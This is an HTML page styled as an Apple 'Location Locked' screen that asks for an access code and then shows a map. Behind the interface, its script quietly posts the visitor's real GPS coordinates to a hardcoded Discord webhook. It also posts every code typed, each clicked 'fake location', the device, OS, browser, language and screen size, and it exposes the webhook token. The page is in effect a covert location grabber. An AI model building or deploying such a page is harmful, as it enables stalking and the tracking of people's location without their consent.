<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Apple Style Location Tracker</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #e6f0ff, #f8fbff);
    }
    #map {
      height: 100vh;
      width: 100vw;
      display: none;
    }
    .popup {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(12px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10;
    }
    .popup-content {
      background: rgba(255, 255, 255, 0.6);
      padding: 30px;
      border-radius: 24px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
      text-align: center;
      max-width: 320px;
      width: 90%;
      backdrop-filter: blur(20px);
      animation: fadeIn 0.5s ease-in-out;
    }
    .popup-content h2 {
      font-weight: 600;
      margin-bottom: 14px;
      color: #1a1a1a;
    }
    .popup-content input {
      padding: 12px;
      width: 100%;
      border-radius: 14px;
      border: none;
      background: rgba(255, 255, 255, 0.7);
      font-size: 16px;
      margin-top: 10px;
      transition: all 0.3s ease;
      box-shadow: inset 0 0 0 1px rgba(0,0,0,0.1);
    }
    .popup-content input:focus {
      outline: none;
      box-shadow: inset 0 0 0 2px #007aff;
      background: white;
    }
    .popup-content button {
      margin-top: 18px;
      padding: 12px 24px;
      border: none;
      background: linear-gradient(to right, #007aff, #559dff);
      color: white;
      font-size: 16px;
      font-weight: 600;
      border-radius: 18px;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    .popup-content button:hover {
      background: linear-gradient(to right, #0065e0, #478dff);
      transform: scale(1.02);
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to   { opacity: 1; transform: scale(1); }
    }
  </style>
</head>
<body>

<!-- Popup -->
<div class="popup" id="popup">
  <div class="popup-content">
    <h2>Location Locked</h2>
    <input type="text" id="codeInput" placeholder="Enter access code">
    <button onclick="checkCode()">Continue</button>
  </div>
</div>

<!-- Karte -->
<div id="map"></div>

<!-- JS -->
<script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
<script>
  const webhookUrl = "https://discord.com/api/webhooks/1340763818195812384/4MkBGKZpLKa7CgBAv-MHkJsRjFaM-tPlPE31x7uUC-_f4EMOfqgnHupLELASCwChUPZo";
  let map, marker;

  const customIcon = L.icon({
    iconUrl: 'https://em-content.zobj.net/source/apple/325/round-pushpin_1f4cd.png',
    iconSize: [40, 40],
    iconAnchor: [20, 40]
  });

  function getDeviceName() {
    const ua = navigator.userAgent;

    if (/iPhone/i.test(ua)) return "iPhone";
    if (/iPad/i.test(ua)) return "iPad";
    if (/Macintosh/i.test(ua)) return "Mac";
    if (/Android/i.test(ua) && /Mobile/i.test(ua)) return "Android Phone";
    if (/Android/i.test(ua)) return "Android Tablet";
    if (/Windows Phone/i.test(ua)) return "Windows Phone";
    if (/Windows/i.test(ua)) return "Windows PC";
    if (/Linux/i.test(ua)) return "Linux";
    return "Unbekanntes Ger√§t";
  }

  function getBrowserName() {
    const ua = navigator.userAgent;
    if (/Edg/i.test(ua)) return "Edge";
    if (/Chrome/i.test(ua)) return "Chrome";
    if (/Firefox/i.test(ua)) return "Firefox";
    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
    return "Unbekannt";
  }

  function getOS() {
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua)) return "Windows";
    if (/Mac OS/i.test(ua)) return "macOS";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Android/i.test(ua)) return "Android";
    if (/Linux/i.test(ua)) return "Linux";
    return "Unbekannt";
  }

  function sendEmbedLog(title, description) {
    const language = navigator.language;
    const width = window.innerWidth;
    const height = window.innerHeight;
    const embed = {
      embeds: [{
        title: title,
        description: description,
        color: 3447003,
        fields: [
          { name: "Ger√§t", value: getDeviceName(), inline: true },
          { name: "OS", value: getOS(), inline: true },
          { name: "Browser", value: getBrowserName(), inline: true },
          { name: "Sprache", value: language, inline: true },
          { name: "Aufl√∂sung", value: `${width}x${height}`, inline: true }
        ],
        timestamp: new Date().toISOString()
      }]
    };

    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embed)
    });
  }

  function checkCode() {
    const code = document.getElementById("codeInput").value;
    if (code === "1234") {
      document.getElementById("popup").style.display = "none";
      document.getElementById("map").style.display = "block";
      sendEmbedLog("‚úÖ Code akzeptiert", "Benutzer hat den Code erfolgreich eingegeben.");

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          map = L.map('map').setView([lat, lon], 15);
          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
          }).addTo(map);

          L.marker([lat, lon], { icon: customIcon }).addTo(map);
          sendEmbedLog("üìç Standort geladen", `Echter Standort: ${lat}, ${lon}`);

          map.on('click', function(e) {
            if (marker) map.removeLayer(marker);
            marker = L.marker(e.latlng, { icon: customIcon }).addTo(map);
            sendEmbedLog("üìå Neue Fake-Location", `Benutzer hat Fake-Standort gesetzt:\nLat: ${e.latlng.lat}, Lng: ${e.latlng.lng}`);
          });

        }, function(error) {
          sendEmbedLog("‚ùå Fehler", "Geolocation verweigert oder fehlgeschlagen.");
        });
      } else {
        sendEmbedLog("‚ùå Fehler", "Geolocation wird nicht unterst√ºtzt.");
      }
    } else {
      alert("Falscher Code.");
      sendEmbedLog("‚ö†Ô∏è Falscher Code", `Eingegebener Code: ${code}`);
    }
  }
</script>

</body>
</html>
